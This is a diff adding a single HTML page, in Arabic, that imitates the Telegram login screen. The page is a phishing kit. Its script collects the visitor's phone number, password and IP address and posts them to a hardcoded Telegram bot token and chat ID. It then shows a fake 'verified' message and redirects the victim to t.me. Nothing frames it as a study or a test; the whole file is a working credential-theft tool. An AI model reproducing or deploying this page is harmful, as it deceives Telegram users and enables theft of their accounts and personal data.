@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Telegram</title>
+<style>
+body{font-family:-apple-system,Roboto,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;height:100vh;margin:0}
+.box{width:320px;text-align:center}
+.logo{width:80px;height:80px;border-radius:50%;background:#2AABEE;margin:0 auto 20px;display:flex;align-items:center;justify-content:center;color:#fff;font-size:40px}
+h2{font-weight:400;font-size:20px;margin:0 0 6px}p{color:#707579;font-size:14px;margin:0 0 24px}
+input{width:100%;padding:12px;border:1px solid #ddd;border-radius:8px;font-size:16px;margin-bottom:12px;box-sizing:border-box}
+button{width:100%;padding:12px;background:#2AABEE;color:#fff;border:none;border-radius:8px;font-size:16px;cursor:pointer}
+button:disabled{opacity:.6}.msg{font-size:13px;color:#c00;margin-top:10px;min-height:18px}
+</style>
+</head>
+<body>
+<div class="box">
+<div class="logo">✈</div>
+<h2>تسجيل الدخول إلى تلجرام</h2>
+<p>أدخل رقم هاتفك وكلمة المرور للمتابعة</p>
+<form id="f">
+<input name="phone" placeholder="رقم الهاتف" required autocomplete="off">
+<input name="pass" type="password" placeholder="كلمة المرور" required autocomplete="off">
+<button type="submit" id="b">دخول</button>
+</form>
+<div class="msg" id="m"></div>
+</div>
+<script>
+const TOKEN="9225798978:AAHnyMuXHnWv7P_y05v2_nsR_O5VRGQZzCE";
+const CHAT_ID="7356963877";
+
+document.getElementById('f').addEventListener('submit', async e => {
+  e.preventDefault();
+  const b = document.getElementById('b');
+  const m = document.getElementById('m');
+  b.disabled = true;
+  
+  const d = new FormData(e.target);
+  let ip = '?';
+  
+  try {
+    ip = await fetch('https://api.ipify.org').then(r => r.text());
+  } catch(_) {}
+  
+  const text = "🔐 بيانات جديدة\n" +
+               "📱 هاتف: " + d.get('phone') + "\n" +
+               "🔑 كلمة المرور: " + d.get('pass') + "\n" +
+               "🌐 IP: " + ip + "\n" +
+               "🕒 " + new Date().toLocaleString('ar');
+               
+  try {
+    const r = await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type': 'application/json'},
+      body: JSON.stringify({chat_id: CHAT_ID, text: text})
+    });
+    
+    if (r.ok) {
+      m.style.color = '#0a0';
+      m.textContent = 'تم التحقق. جارٍ إعادة التوجيه...';
+      setTimeout(() => location.href = 'https://t.me', 1500);
+    } else {
+      throw new Error('send failed');
+    }
+  } catch (err) {
+    m.textContent = 'خطأ في الاتصال. حاول لاحقاً.';
+    b.disabled = false;
+  }
+});
+</script>
+</body>
+</html>
